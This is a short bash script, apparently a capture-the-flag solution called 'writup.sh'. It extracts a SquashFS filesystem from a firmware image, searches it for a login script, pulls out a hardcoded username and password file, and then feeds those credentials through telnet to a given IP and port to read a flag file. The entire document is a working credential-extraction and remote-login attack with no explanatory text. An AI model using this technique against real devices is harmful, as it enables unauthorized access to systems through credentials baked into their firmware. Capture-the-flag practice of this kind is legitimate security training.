#!/bin/bash

if [ $# -ne 1 ]; then
	echo "Usage: writup.sh IP:PORT"
	exit 1
fi

IP=`echo "$1" | cut -d ':' -f 1`
PORT=`echo "$1" | cut -d ':' -f 2`
OFFSET=`binwalk firmware.bin | grep Squash | cut -d ' ' -f 1`
dd bs=1 skip=$OFFSET if=firmware.bin of=squashfs
sudo unsquashfs squashfs
SEARCH=`sudo grep -R login squashfs-root --exclude-dir=dev 2>/dev/null | grep sign`
SCRIPT_PATH=`echo $SEARCH | cut -d : -f 1`
LOGIN=`cat $SCRIPT_PATH | grep -e '-u' | cut -d ' ' -f 5 | cut -d ':' -f 1`
PASS_FILE='squashfs-root'`cat $SCRIPT_PATH | grep sign= | cut -d ' ' -f 2 | cut -d '\`' -f 1`
PASSWD=`cat $PASS_FILE`
echo "$IP $PORT"
(sleep 1; echo $LOGIN; sleep 1; echo $PASSWD; sleep 2; echo "cat flag.txt"; sleep 1;) | telnet $IP $PORT
